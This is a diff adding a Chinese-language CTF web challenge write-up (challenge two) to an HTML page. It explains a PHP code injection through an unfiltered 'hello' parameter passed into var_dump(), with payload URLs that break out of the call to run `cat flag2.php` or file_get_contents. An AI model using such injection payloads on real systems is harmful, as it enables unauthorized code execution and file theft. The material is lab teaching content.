@@ -547,6 +547,29 @@ $匹配字符结束的位置
 <p>答案很明了了：
 <div class="codehilite"><pre><span></span>[服务器链接]/index1.php?args=GLOBALS
 </pre></div></p>
+<h1 id="_5">题目二：<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h1>
+<p>题目链接：（右键下载即可）</p>
+<p><a href="https://raw.githubusercontent.com/wonderkun/CTF_web/master/web100-5/index2.php">index2.php</a>
+<a href="https://raw.githubusercontent.com/wonderkun/CTF_web/master/web100-5/flag2.php">flag2.php</a></p>
+<h2 id="_6">分析<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p>$a是输入的hello值，然而并没有对hello内容进行限制</p>
+<p>这里可以作为突破点进行注入
+<div class="codehilite"><pre><span></span>var_dump(  [内容]  );
+</pre></div>
+让[内容]为<code>1);echo `cat flag2.php`;//</code>即
+<div class="codehilite"><pre><span></span>var_dump(1);
+echo &#39;cat flag2.php&#39;;
+</pre></div>
+也可以让[内容]为<code>file_get_contents('flag2.php')</code></p>
+<h2 id="_7">知识点<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p>$_REQUEST：
+<div class="codehilite"><pre><span></span>默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。
+</pre></div></p>
+<h2 id="_8">答案<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<p><div class="codehilite"><pre><span></span>[服务器地址]/index2.php?hello=1);echo &#39;cat flag2.php&#39;;//
+</pre></div>
+<div class="codehilite"><pre><span></span>[服务器地址]/index2.php?hello=file_get_contents(&#39;flag2.php&#39;)
+</pre></div></p>
                 
                   
                 
